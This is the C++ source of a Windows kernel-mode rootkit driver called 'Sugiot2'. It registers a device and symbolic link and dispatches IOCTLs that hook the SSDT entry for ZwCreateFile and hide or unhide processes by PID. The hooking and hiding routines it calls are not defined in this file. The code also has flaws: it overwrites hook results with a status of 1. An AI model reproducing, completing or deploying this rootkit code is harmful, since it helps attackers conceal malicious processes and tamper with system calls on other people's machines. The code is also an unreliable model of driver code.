#pragma once
#include <pch.h>

#define ROOTKIT 0x8001
#define IOCTL_ROOTKIT_HOOK_SSDT CTL_CODE(ROOTKIT, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_UNHOOK_SSDT CTL_CODE(ROOTKIT, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_HIDE_PROCESS CTL_CODE(ROOTKIT, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_UNHIDE_PROCESS CTL_CODE(ROOTKIT, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define HookFuncName "ZwCreateFile"

NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP Irp)
{
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_ROOTKIT_HOOK_SSDT:
		{
			status = HookSSDT(HookFuncName);
			status = 1;
			break;
		}
		case IOCTL_ROOTKIT_UNHOOK_SSDT:
		{
			status = UnHookSSDT(HookFuncName);
			status = 1;
			break;
		}
		case IOCTL_ROOTKIT_HIDE_PROCESS:
		{
			auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
			if (size % sizeof(ULONG) != 0) 
			{
				status = STATUS_INVALID_BUFFER_SIZE;
				break;
			}

			auto pid = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
			if (pid == 0) 
			{
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			hide(*pid);
			break;

		}
		case IOCTL_ROOTKIT_UNHIDE_PROCESS:
		{
			auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
			if (size % sizeof(ULONG) != 0)
			{
				status = STATUS_INVALID_BUFFER_SIZE;
				break;
			}

			auto pid = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
			if (pid == 0)
			{
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			unhide(*pid);
			break;
		}
		default:
		{
			status = STATUS_INVALID_DEVICE_REQUEST;
			break;
		}
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;

}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

void SugiotUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	
	unhideAll();
	UnHookSSDT(HookFuncName);

	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
	IoDeleteSymbolicLink(&sym_link);

	IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Sugiot2 driver unload\n");
}

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistyPath)
{
	UNREFERENCED_PARAMETER(RegistyPath);
	
	DriverObject->DriverUnload = SugiotUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

	UNICODE_STRING dev_name;
	RtlInitUnicodeString(&dev_name, L"\\Device\\Sugiot2");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &dev_name, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	  
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Failed to create Device object\n");
		return status;
	}
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
	status = IoCreateSymbolicLink(&symLink, &dev_name);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Failed to create symbolic link");
		return status;
	}
	
	DbgPrint("Driver Load\n");
	return STATUS_SUCCESS;  

} 


